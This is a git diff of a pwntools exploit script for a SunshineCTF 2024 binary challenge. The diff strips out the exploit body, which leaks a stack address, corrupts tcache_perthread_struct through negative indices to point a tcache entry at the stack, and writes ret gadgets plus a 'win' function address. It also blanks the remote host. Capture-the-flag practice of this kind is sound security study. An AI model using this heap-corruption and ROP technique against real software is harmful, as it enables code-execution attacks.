@@ -4,7 +4,7 @@ from pwn import *
 context.update(
         arch="amd64",
         endian="little",
-        log_level="info",
+        log_level="debug",
         os="linux",
         terminal=["alacritty", "-e"]
 )
@@ -16,8 +16,8 @@ sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
 sl = lambda p,a: p.sendline(a)
 up = lambda b: int.from_bytes(b, byteorder="little")
 
-SERVICE = "2024.sunshinectf.games"
-PORT =  24006
+SERVICE = ""
+PORT = 1234
 
 def start(binary):
 
@@ -56,54 +56,11 @@ def view(p, index):
     sl(p,"%i" % index)
     ru(p,b"")
     return rl(p)
-
-def align_chunk(addr):
-    return (addr + 0x20) & 0xfffffffffffffff0
-
+    
 
 def exploit(p,e):
 
-    ru(p,b"Do you want a leak?")
-
-    sl(p,p64(0x500))
-    
-    rl(p)
-    stack_leak = int(rl(p).strip(b"\n"),16)
-    log.info(f"Stack leak {hex(stack_leak)}")
-
-    ru(p,b"Enter chunk size:")
-
-    chunk_size = 0x38
-
-    sl(p,str(chunk_size))
-
-    ru(p,b"Index: ")
-
-    pthread_struct_entry_offset = -(int)(4624 / 8)
-    sl(p,str(pthread_struct_entry_offset))
-
-    target = stack_leak
-    log.info(f"Setting tcache_perthread_struct entry to {hex(target)}")
-    ru(p,b"Value: ")
-    sl(p,str(target + 0x20).encode())
-
-    ru(p,b"Index: ")
-    pthread_struct_offset_count = -(int)(4768 / 8)
-    sl(p,str(pthread_struct_offset_count))
-
-    ru(p,b"Value: ")
-    sl(p,str(0x1000100010001))
-
-    r = ROP(e)
-    for i in range(2):
-        ru(p,b"Value: ")
-        sl(p,str(r.find_gadget(["ret"])[0]))
-
-    ru(p,b"Value: ")
-    sl(p,str(e.sym["win"]))
-
     p.interactive()
-
     
 
 if __name__=="__main__":
